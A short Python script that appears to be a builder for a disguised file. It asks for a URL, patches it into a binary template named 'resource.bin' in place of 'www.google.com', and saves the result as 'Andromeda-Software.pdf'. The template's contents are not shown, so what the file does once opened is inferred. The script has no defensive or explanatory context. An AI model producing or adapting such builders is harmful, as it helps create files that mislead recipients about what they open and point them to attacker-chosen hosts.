import sys
import os
import socket

NameFile = input("URL: ").encode()
FileNameOutPut = open("Andromeda-Software.pdf","wb+")
FileNameInput = open ("resource.bin","rb+")
s = FileNameInput.read()
s = s.replace(b"www.google.com", NameFile)
FileNameOutPut.write(s)